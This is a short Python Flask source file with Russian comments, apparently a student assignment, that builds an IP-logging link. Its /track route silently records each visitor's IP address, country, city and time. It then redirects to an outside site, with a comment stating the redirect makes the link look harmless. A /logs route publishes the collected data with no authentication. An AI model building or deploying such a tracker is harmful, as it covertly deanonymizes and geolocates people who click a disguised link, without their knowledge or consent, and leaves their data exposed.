from flask import Flask, request, redirect
from werkzeug.middleware.proxy_fix import ProxyFix
import whereismyip
from datetime import datetime

app = Flask(__name__)

# Важно: Render использует прокси, без этого IP будет внутренним
app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1)

# Хранилище в памяти (для учебного проекта; при перезапуске очищается)
visits = []

@app.route('/track')
def track():
    # Получаем реальный IP (ProxyFix уже подменил remote_addr)
    ip = request.remote_addr
    
    # Пытаемся получить геоданные (бесплатный API, может быть неточным)
    try:
        geo = whereismyip.whereismyip_dict(ip)
        country = geo.get('country', 'Unknown')
        city = geo.get('city', 'Unknown')
    except Exception:
        country = city = 'Lookup failed'
    
    visits.append({
        'ip': ip,
        'country': country,
        'city': city,
        'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    })
    
    # Редирект на сайт преподавателя (чтобы ссылка выглядела безобидно)
    return redirect('https://pappinpub.ru')

@app.route('/logs')
def logs():
    # Простая страница для просмотра (можно закрыть паролем, но для задания ок)
    return {'visits': visits}

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)